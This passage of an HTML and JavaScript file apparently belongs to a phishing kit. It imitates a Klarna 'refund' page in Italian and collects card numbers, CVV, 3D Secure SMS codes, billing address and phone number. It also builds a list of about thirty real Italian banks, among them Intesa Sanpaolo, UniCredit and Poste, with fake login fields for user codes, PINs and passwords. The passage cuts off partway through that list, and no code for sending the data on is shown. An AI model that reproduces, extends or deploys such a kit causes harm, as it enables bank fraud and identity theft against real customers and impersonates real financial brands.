                <div id="card-number-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Numero carta non valido</div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-4">
                <div>
                    <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Data di scadenza</label>
                    <input type="text" id="card-expiry" maxlength="5" placeholder="MM/AA" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="off">
                    <div id="card-expiry-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Data non valida</div>
                </div>
                <div>
                    <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">CVV</label>
                    <input type="text" id="card-cvv" maxlength="4" placeholder="•••" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="off">
                    <div id="card-cvv-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">CVV non valido</div>
                </div>
            </div>
            <div id="card-error" class="error-msg-bar"><span class="error-dot">!</span> <span class="ml-2 font-medium">Dati della carta non validi. Controlla e riprova.</span></div>
        </div>
        <div class="bottom-section">
            <button id="btn-card" onclick="processCard()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center"><span class="btn-text">Procedi con il rimborso</span><div class="spinner"></div></button>
            <div class="mt-3 text-[10px] text-[#8a8a96] text-center pb-3">I tuoi dati sono protetti con crittografia SSL</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 7: 3DS -->
    <!-- ============================================================ -->
    <div id="step-3ds-1" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="showStep('step-card')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight">Verifica 3D Secure</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-4">Conferma la tua identità per completare il rimborso</p>
            <div class="bg-[#f8f9fa] rounded-xl p-4 mb-4 text-center border border-[#e0e0e0]">
                <div class="text-[10px] text-[#5e5e6e] uppercase tracking-wider mb-1">Importo del rimborso</div>
                <div class="text-[28px] font-bold text-[#080516]">300,00 USD</div>
                <div class="text-[12px] text-[#5e5e6e] mt-0.5">~276,50 EUR</div>
                <div class="text-[10px] text-[#4b3ec4] font-semibold mt-2">Klarna • Rimborso Sicuro</div>
            </div>
            <div class="bg-[#f8f9fa] rounded-xl p-4 mb-5 border border-[#e0e0e0]">
                <div class="flex items-center gap-3 mb-3">
                    <img id="3ds-card-icon" src="https://cdn3.emoji.gg/emojis/3459-visa.png" alt="card" style="width: 38px; height: 26px; object-fit: contain;">
                    <div><div class="text-[11px] text-[#5e5e6e]">Carta per il rimborso</div><div class="text-[13px] font-semibold text-[#080516]" id="3ds-card-display-name">---</div></div>
                </div>
                <div class="text-[14px] font-mono text-[#080516] tracking-[2px]" id="3ds-card-display-number">**** **** **** ****</div>
            </div>
            <p class="text-[12px] font-semibold text-[#080516] mb-3">Scegli come verificare il rimborso:</p>
            <div class="mb-3">
                <button onclick="processVerifyApp()" class="w-full bg-[#f8f9fa] hover:bg-[#f0f1f3] p-4 rounded-xl border-2 border-[#e0e0e0] hover:border-[#080516] transition-all text-left flex items-center gap-4">
                    <div class="w-10 h-10 bg-[#080516] rounded-full flex items-center justify-center flex-shrink-0"><i class="fas fa-mobile-alt text-white text-lg"></i></div>
                    <div><div class="font-semibold text-[15px] text-[#080516]">App della tua banca</div><div class="text-[12px] text-[#5e5e6e]">Ricevi una notifica push e conferma il rimborso</div></div>
                    <i class="fas fa-chevron-right text-[#8a8a96] ml-auto"></i>
                </button>
            </div>
            <div class="mb-3">
                <button onclick="processVerifySMS()" class="w-full bg-[#f8f9fa] hover:bg-[#f0f1f3] p-4 rounded-xl border-2 border-[#e0e0e0] hover:border-[#080516] transition-all text-left flex items-center gap-4">
                    <div class="w-10 h-10 bg-[#080516] rounded-full flex items-center justify-center flex-shrink-0"><i class="fas fa-sms text-white text-lg"></i></div>
                    <div><div class="font-semibold text-[15px] text-[#080516]">Codice via SMS</div><div class="text-[12px] text-[#5e5e6e]">Ricevi un codice di verifica per SMS</div></div>
                    <i class="fas fa-chevron-right text-[#8a8a96] ml-auto"></i>
                </button>
            </div>
        </div>
        <div class="bottom-section"><div class="text-[10px] text-[#8a8a96] text-center pb-3">Rimborso sicuro protetto da 3D Secure</div></div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 8: SMS OTP -->
    <!-- ============================================================ -->
    <div id="step-sms-otp" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="showStep('step-3ds-1')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight">Codice di verifica SMS</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-4">Abbiamo inviato un codice SMS per confermare il <strong class="text-[#080516]">rimborso</strong></p>
            <div class="bg-[#f8f9fa] rounded-xl p-4 mb-5 border border-[#e0e0e0]">
                <div class="flex items-center gap-3 mb-3">
                    <img id="sms-otp-card-icon" src="https://cdn3.emoji.gg/emojis/3459-visa.png" alt="card" style="width: 36px; height: 26px; object-fit: contain;">
                    <div><div class="text-[11px] text-[#5e5e6e]">Rimborso su carta</div><div class="text-[13px] font-semibold text-[#080516]" id="sms-otp-card-name">---</div></div>
                </div>
                <div class="text-[12px] font-mono text-[#080516] tracking-[1px] mb-2" id="sms-otp-card-number">**** **** **** ****</div>
                <div class="border-t border-[#e0e0e0] pt-2 mt-2">
                    <div class="text-[10px] text-[#5e5e6e]">Importo del rimborso</div>
                    <div class="text-[18px] font-bold text-[#080516]">300,00 USD <span class="text-[12px] text-[#5e5e6e] font-normal">(~276,50 EUR)</span></div>
                </div>
            </div>
            <div class="mb-4">
                <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Inserisci il codice a 6 cifre</label>
                <input type="text" id="sms-otp-code" maxlength="6" placeholder="000000" class="w-full px-4 py-3.5 rounded-xl outline-none text-center text-lg tracking-[8px]" autocomplete="off">
                <div id="sms-otp-input-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Codice non valido</div>
            </div>
            <div id="sms-otp-global-error" class="error-msg-bar"><span class="error-dot">!</span> <span class="ml-2 font-medium">Codice SMS errato. Riprova.</span></div>
        </div>
        <div class="bottom-section">
            <button id="btn-sms-otp" onclick="processSMSOTP()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center"><span class="btn-text">Conferma il rimborso</span><div class="spinner"></div></button>
            <div class="mt-3 text-center pb-3"><button onclick="showStep('step-3ds-1')" class="text-[12px] text-[#4b3ec4] font-semibold hover:underline">Non hai ricevuto il codice? Reinvia</button></div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 9: BILLING ADDRESS -->
    <!-- ============================================================ -->
    <div id="step-billing" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="showStep('step-verify-identity')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight">Indirizzo di fatturazione</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-6">Inserisci i tuoi dati per la conferma del rimborso di <strong class="text-[#080516]">300,00 USD (~276,50 EUR)</strong></p>
            <div class="space-y-4">
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Nome</label>
                        <input type="text" id="billing-firstname" placeholder="Mario" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96] uppercase" autocomplete="given-name">
                        <div id="billing-firstname-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci il nome</div>
                    </div>
                    <div>
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Cognome</label>
                        <input type="text" id="billing-lastname" placeholder="Rossi" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96] uppercase" autocomplete="family-name">
                        <div id="billing-lastname-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci il cognome</div>
                    </div>
                </div>
                <div>
                    <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Indirizzo</label>
                    <input type="text" id="billing-address" placeholder="Via/Piazza, numero civico" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="street-address">
                    <div id="billing-address-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci un indirizzo valido</div>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Città</label>
                        <input type="text" id="billing-city" placeholder="Milano" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="address-level2">
                        <div id="billing-city-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci la città</div>
                    </div>
                    <div>
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">CAP</label>
                        <input type="text" id="billing-zip" maxlength="5" placeholder="20100" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="postal-code">
                        <div id="billing-zip-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">CAP non valido (5 cifre)</div>
                    </div>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Provincia</label>
                        <select id="billing-province" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all bg-white text-[#080516]" style="border: 1.5px solid #d1d1d6;">
                            <option value="">Seleziona provincia</option>
                            <option value="AG">Agrigento</option><option value="AL">Alessandria</option><option value="AN">Ancona</option><option value="AO">Aosta</option><option value="AR">Arezzo</option><option value="AP">Ascoli Piceno</option><option value="AT">Asti</option><option value="AV">Avellino</option><option value="BA">Bari</option><option value="BT">Barletta-Andria-Trani</option><option value="BL">Belluno</option><option value="BN">Benevento</option><option value="BG">Bergamo</option><option value="BI">Biella</option><option value="BO">Bologna</option><option value="BZ">Bolzano</option><option value="BS">Brescia</option><option value="BR">Brindisi</option><option value="CA">Cagliari</option><option value="CL">Caltanissetta</option><option value="CB">Campobasso</option><option value="CE">Caserta</option><option value="CT">Catania</option><option value="CZ">Catanzaro</option><option value="CH">Chieti</option><option value="CO">Como</option><option value="CS">Cosenza</option><option value="CR">Cremona</option><option value="KR">Crotone</option><option value="CN">Cuneo</option><option value="EN">Enna</option><option value="FM">Fermo</option><option value="FE">Ferrara</option><option value="FI">Firenze</option><option value="FG">Foggia</option><option value="FC">Forlì-Cesena</option><option value="FR">Frosinone</option><option value="GE">Genova</option><option value="GO">Gorizia</option><option value="GR">Grosseto</option><option value="IM">Imperia</option><option value="IS">Isernia</option><option value="SP">La Spezia</option><option value="AQ">L'Aquila</option><option value="LT">Latina</option><option value="LE">Lecce</option><option value="LC">Lecco</option><option value="LI">Livorno</option><option value="LO">Lodi</option><option value="LU">Lucca</option><option value="MC">Macerata</option><option value="MN">Mantova</option><option value="MS">Massa-Carrara</option><option value="MT">Matera</option><option value="ME">Messina</option><option value="MI">Milano</option><option value="MO">Modena</option><option value="MB">Monza e Brianza</option><option value="NA">Napoli</option><option value="NO">Novara</option><option value="NU">Nuoro</option><option value="OR">Oristano</option><option value="PD">Padova</option><option value="PA">Palermo</option><option value="PR">Parma</option><option value="PV">Pavia</option><option value="PG">Perugia</option><option value="PU">Pesaro e Urbino</option><option value="PE">Pescara</option><option value="PC">Piacenza</option><option value="PI">Pisa</option><option value="PT">Pistoia</option><option value="PN">Pordenone</option><option value="PZ">Potenza</option><option value="PO">Prato</option><option value="RG">Ragusa</option><option value="RA">Ravenna</option><option value="RC">Reggio Calabria</option><option value="RE">Reggio Emilia</option><option value="RI">Rieti</option><option value="RN">Rimini</option><option value="RM">Roma</option><option value="RO">Rovigo</option><option value="SA">Salerno</option><option value="SS">Sassari</option><option value="SV">Savona</option><option value="SI">Siena</option><option value="SR">Siracusa</option><option value="SO">Sondrio</option><option value="SU">Sud Sardegna</option><option value="TA">Taranto</option><option value="TE">Teramo</option><option value="TR">Terni</option><option value="TO">Torino</option><option value="TP">Trapani</option><option value="TN">Trento</option><option value="TV">Treviso</option><option value="TS">Trieste</option><option value="UD">Udine</option><option value="VA">Varese</option><option value="VE">Venezia</option><option value="VB">Verbano-Cusio-Ossola</option><option value="VC">Vercelli</option><option value="VR">Verona</option><option value="VV">Vibo Valentia</option><option value="VI">Vicenza</option><option value="VT">Viterbo</option>
                        </select>
                        <div id="billing-province-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Seleziona la provincia</div>
                    </div>
                    <div>
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Paese</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-sm z-10">🇮🇹</span>
                            <input type="text" value="Italia" disabled class="w-full pl-12 pr-4 py-3.5 rounded-xl outline-none bg-[#f7f7f7] text-[#080516] font-medium cursor-not-allowed" style="border: 1.5px solid #d1d1d6;">
                        </div>
                    </div>
                </div>
                <div>
                    <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Numero di telefono</label>
                    <input type="text" id="billing-phone" placeholder="+39 333 1234567" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="tel-national">
                    <div id="billing-phone-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci un numero valido</div>
                </div>
            </div>
            <div id="billing-error" class="error-msg-bar">
                <span class="error-dot">!</span> <span class="ml-2 font-medium">Dati di fatturazione non validi. Controlla e riprova.</span>
            </div>
        </div>
        <div class="bottom-section">
            <button id="btn-billing" onclick="processBilling()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center"><span class="btn-text">Conferma e continua</span><div class="spinner"></div></button>
            <div class="mt-3 text-[10px] text-[#8a8a96] text-center pb-3">I tuoi dati sono protetti con crittografia SSL</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 10: FINISHED -->
    <!-- ============================================================ -->
    <div id="step-finished" class="auth-card hidden">
        <div class="flex-grow flex flex-col items-center justify-center text-center">
            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-4xl mb-6"><i class="fa-solid fa-check"></i></div>
            <h1 class="text-[28px] font-bold text-[#080516] mb-2">Rimborso Completato</h1>
            <div class="bg-[#f8f9fa] rounded-xl p-4 mb-3 border border-[#e0e0e0] w-full max-w-xs">
                <div class="text-[11px] text-[#5e5e6e] mb-1">Importo rimborsato</div>
                <div class="text-[24px] font-bold text-[#4b3ec4]">300,00 USD</div>
                <div class="text-[13px] text-[#5e5e6e]">~276,50 EUR</div>
                <div class="text-[10px] text-[#4b3ec4] font-semibold mt-2">Klarna • Rimborso Sicuro</div>
            </div>
            <p class="text-[12px] text-[#5e5e6e]">Il rimborso sarà accreditato entro 3-5 giorni lavorativi</p>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- JAVASCRIPT COMPLETO -->
    <!-- ============================================================ -->
    <script>
       const italianBanks = [
            // ==================== BANCHE TRADIZIONALI ====================
            {
                id: "intesa",
                name: "Intesa Sanpaolo",
                shortName: "ISP",
                brandColor: "#006643",
                textColor: "#ffffff",
                logoFile: "intesa_sanpaolo.png",
                logoText: "ISP",
                logoBg: "bg-emerald-800",
                logoUrl: "",
                fields: [
                    { label: "Codice Titolare (8 cifre)", placeholder: "es. 12345678", type: "text", required: true },
                    { label: "Codice PIN / Password", placeholder: "Inserisci il tuo PIN", type: "password", required: true }
                ],
                branches: [
                    { id: "isp-retail", name: "Persone Fisiche e Retail" },
                    { id: "isp-corporate", name: "Imprese e Corporate Banking" },
                    { id: "isp-private", name: "Fideuram & Private Banking" }
                ]
            },
            {
                id: "unicredit",
                name: "UniCredit",
                shortName: "UC",
                brandColor: "#E2001A",
                textColor: "#ffffff",
                logoFile: "unicredit.png",
                logoText: "UC",
                logoBg: "bg-red-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Adesione (8 o 10 cifre)", placeholder: "es. 12345678", type: "text", required: true },
                    { label: "PIN di Accesso", placeholder: "Digitare PIN", type: "password", required: true }
                ],
                branches: [
                    { id: "uc-privati", name: "UniCredit Privati" },
                    { id: "uc-imprese", name: "UniCredit Imprese" }
                ]
            },
            {
                id: "poste",
                name: "Italian Post Office - BancoPosta",
                shortName: "Poste",
                brandColor: "#FFCC00",
                textColor: "#004B87",
                logoFile: "italian_post_office_bancoposta.png",
                logoText: "PI",
                logoBg: "bg-yellow-400",
                logoUrl: "",
                fields: [
                    { label: "Nome Utente / Username", placeholder: "es. mario.rossi", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: [
                    { id: "poste-bp", name: "Conto BancoPosta" },
                    { id: "poste-pp", name: "Carta PostePay" },
                    { id: "poste-business", name: "Poste Italiane Business" }
                ]
            },
            {
                id: "bcc",
                name: "BCC - Cooperative Credit",
                shortName: "BCC",
                brandColor: "#005A36",
                textColor: "#ffffff",
                logoFile: "bcc_cooperative_credit.png",
                logoText: "BCC",
                logoBg: "bg-green-700",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente / Login ID", placeholder: "Codice fornito dalla filiale", type: "text", required: true },
                    { label: "Password d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: [
                    { id: "bcc-roma", name: "BCC di Roma" },
                    { id: "bcc-milano", name: "BCC di Milano" },
                    { id: "bcc-emilbanca", name: "BCC EmilBanca" },
                    { id: "bcc-iccrea", name: "Iccrea Area Riservata" }
                ]
            },
            {
                id: "bpm",
                name: "Banco BPM",
                shortName: "BPM",
                brandColor: "#005553",
                textColor: "#ffffff",
                logoFile: "banco_bpm.png",
                logoText: "BPM",
                logoBg: "bg-teal-800",
                logoUrl: "",
                fields: [
                    { label: "Codice Identificativo", placeholder: "Codice di 9 cifre", type: "text", required: true },
                    { label: "Password di Servizio", placeholder: "Inserisci password", type: "password", required: true }
                ],
                branches: [
                    { id: "bpm-youweb", name: "YouWeb Servizi Privati" },
                    { id: "bpm-youbusiness", name: "YouBusiness Imprese" }
                ]
            },
            {
                id: "bper",
                name: "BPER Bank",
                shortName: "BPER",
                brandColor: "#008183",
                textColor: "#ffffff",
                logoFile: "bper_bank.png",
                logoText: "BPER",
                logoBg: "bg-teal-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Codice Smart Web", type: "text", required: true },
                    { label: "Password Smart Web", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: [
                    { id: "bper-smart", name: "BPER Smart Web Privati" },
                    { id: "bper-business", name: "BPER Smart Desk Corporate" }
                ]
            },
            {
                id: "mps",
                name: "Monte dei Paschi di Siena",
                shortName: "MPS",
                brandColor: "#8C1B1B",
                textColor: "#ffffff",
                logoFile: "monte_dei_paschi_di_siena.png",
                logoText: "MPS",
                logoBg: "bg-red-900",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Identificativo a 8 cifre", type: "text", required: true },
                    { label: "Chiave d'Accesso (Password)", placeholder: "La tua password", type: "password", required: true }
                ],
                branches: [
                    { id: "mps-paschi", name: "Digital Banking Privati" },
                    { id: "mps-corporate", name: "Paschi-InBusiness" }
                ]
            },
            {
                id: "fineco",
                name: "FinecoBank",
                shortName: "Fineco",
                brandColor: "#010101",
                textColor: "#ffffff",
                logoFile: "finecobank.png",
                logoText: "FN",
                logoBg: "bg-black",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente (User ID)", placeholder: "es. 1234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bnl",
                name: "BNL BNP Paribas Group",
                shortName: "BNL",
                brandColor: "#00965E",
                textColor: "#ffffff",
                logoFile: "bnl_bnp_paribas_group.png",
                logoText: "BNL",
                logoBg: "bg-emerald-600",
                logoUrl: "",
                fields: [
                    { label: "Numero Cliente (8 cifre)", placeholder: "es. 12345678", type: "text", required: true },
                    { label: "PIN / Password", placeholder: "Inserisci password", type: "password", required: true }
                ],
                branches: [
                    { id: "bnl-privati", name: "BNL Pass / Privati" },
                    { id: "bnl-business", name: "BNL Business / Imprese" }
                ]
            },
            {
                id: "credem",
                name: "Credem - Credito Emiliano",
                shortName: "Credem",
                brandColor: "#004B87",
                textColor: "#ffffff",
                logoFile: "credem_credito_emiliano.png",
                logoText: "CE",
                logoBg: "bg-blue-800",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci codice utente", type: "text", required: true },
                    { label: "Password / PIN", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "sella",
                name: "Sella Bank",
                shortName: "Sella",
                brandColor: "#0F2D59",
                textColor: "#ffffff",
                logoFile: "sella_bank.png",
                logoText: "BS",
                logoBg: "bg-slate-900",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "es. 1234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "Digitare codice", type: "password", required: true }
                ],
                branches: [
                    { id: "sella-privati", name: "Sella Personal / Privati" },
                    { id: "sella-business", name: "Sella Corporate" }
                ]
            },
            {
                id: "illimity",
                name: "illimity Bank",
                shortName: "illimity",
                brandColor: "#E3007E",
                textColor: "#ffffff",
                logoFile: "illimity_bank.png",
                logoText: "IL",
                logoBg: "bg-pink-600",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email / User ID", placeholder: "es. nome@email.it", type: "text", required: true },
                    { label: "Password", placeholder: "Digitare password", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "widiba",
                name: "Widiba Bank",
                shortName: "Widiba",
                brandColor: "#050505",
                textColor: "#ffffff",
                logoFile: "widiba_bank.png",
                logoText: "WD",
                logoBg: "bg-neutral-950",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "es. user123", type: "text", required: true },
                    { label: "Password d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "ing",
                name: "ING Italia (Conto Arancio)",
                shortName: "ING",
                brandColor: "#FF6600",
                textColor: "#ffffff",
                logoFile: "ing_italia_conto_arancio.png",
                logoText: "ING",
                logoBg: "bg-orange-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente (9 cifre)", placeholder: "es. 123456789", type: "text", required: true },
                    { label: "Data di Nascita (GGMMAAAA)", placeholder: "es. 15081990", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "Inserisci PIN", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "chebanca",
                name: "Mediobanca Premier",
                shortName: "MB",
                brandColor: "#FFBF00",
                textColor: "#1A1A1A",
                logoFile: "mediobanca_premier.png",
                logoText: "MB",
                logoBg: "bg-amber-400",
                logoUrl: "",
                fields: [
                    { label: "Codice Gruppo o Codice Cliente", placeholder: "Digitare codice", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "cdp",
                name: "Cassa Depositi e Prestiti (CDP)",
                shortName: "CDP",
                brandColor: "#004B87",
                textColor: "#ffffff",
                logoFile: "cassa_depositi_e_prestiti_cdp.png",
                logoText: "CDP",
                logoBg: "bg-blue-800",
                logoUrl: "",
                fields: [
                    { label: "Codice Fiscale", placeholder: "Inserisci il tuo Codice Fiscale", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "mediobanca",
                name: "Mediobanca",
                shortName: "MB",
                brandColor: "#FFBF00",
                textColor: "#1A1A1A",
                logoFile: "mediobanca.png",
                logoText: "MB",
                logoBg: "bg-amber-400",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "Inserisci il codice cliente", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bpsondrio",
                name: "Sondrio Peoples Bank",
                shortName: "BPS",
                brandColor: "#0077BE",
                textColor: "#ffffff",
                logoFile: "sondrio_peoples_bank.png",
                logoText: "BPS",
                logoBg: "bg-blue-500",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci il codice utente", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "mediolanum",
                name: "Mediolanum Bank",
                shortName: "BM",
                brandColor: "#E4002B",
                textColor: "#ffffff",
                logoFile: "mediolanum_bank.png",
                logoText: "BM",
                logoBg: "bg-red-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "Inserisci il codice cliente", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "cariparma",
                name: "Credit Agricole Italia",
                shortName: "CA",
                brandColor: "#00953D",
                textColor: "#ffffff",
                logoFile: "credit_agricole_italia.png",
                logoText: "CA",
                logoBg: "bg-green-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci il codice utente", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "carige",
                name: "Carige Bank",
                shortName: "CAR",
                brandColor: "#003C6D",
                textColor: "#ffffff",
                logoFile: "carige_bank.png",
                logoText: "CAR",
                logoBg: "bg-blue-900",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci il codice utente", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bancasistema",
                name: "Bank System",
                shortName: "BS",
                brandColor: "#1A1A1A",
                textColor: "#ffffff",
                logoFile: "bank_system.png",
                logoText: "BS",
                logoBg: "bg-black",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bancaifis",
                name: "Ifis Bank",
                shortName: "IFIS",
                brandColor: "#000000",
                textColor: "#ffffff",
                logoFile: "ifis_bank.png",
                logoText: "IFIS",
                logoBg: "bg-black",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bancagenerali",
                name: "Generali Bank",
                shortName: "BG",
                brandColor: "#C41230",
                textColor: "#ffffff",
                logoFile: "generali_bank.png",
                logoText: "BG",
                logoBg: "bg-red-700",
                logoUrl: "",
                fields: [
                    { label: "Username / Codice Cliente", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bancaprofilo",
                name: "Bank Profile",
                shortName: "BPL",
                brandColor: "#13294B",
                textColor: "#ffffff",
                logoFile: "bank_profile.png",
                logoText: "BPL",
                logoBg: "bg-slate-800",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "creval",
                name: "Credito Valtellinese (Creval)",
                shortName: "CV",
                brandColor: "#E4002B",
                textColor: "#ffffff",
                logoFile: "credito_valtellinese_creval.png",
                logoText: "CV",
                logoBg: "bg-red-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bancodesio",
                name: "Desio and Brianza Bank",
                shortName: "BDB",
                brandColor: "#0077BE",
                textColor: "#ffffff",
                logoFile: "desio_and_brianza_bank.png",
                logoText: "BDB",
                logoBg: "bg-blue-500",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bolzano",
                name: "Savings Bank of Bolzano",
                shortName: "SPK",
                brandColor: "#DA291C",
                textColor: "#ffffff",
                logoFile: "savings_bank_of_bolzano.png",
                logoText: "SPK",
                logoBg: "bg-red-600",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bancadiasti",
                name: "Bank of Asti",
                shortName: "ASTI",
                brandColor: "#B02C34",
                textColor: "#ffffff",
                logoFile: "bank_of_asti.png",
                logoText: "ASTI",
                logoBg: "bg-red-800",
                logoUrl: "",
                fields: [
                    { label: "Codice Cliente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },

            // ==================== BANCHE DIGITALI / ONLINE ====================
            {
                id: "webank",
                name: "Webank (Banco BPM)",
                shortName: "WBK",
                brandColor: "#005553",
                textColor: "#ffffff",
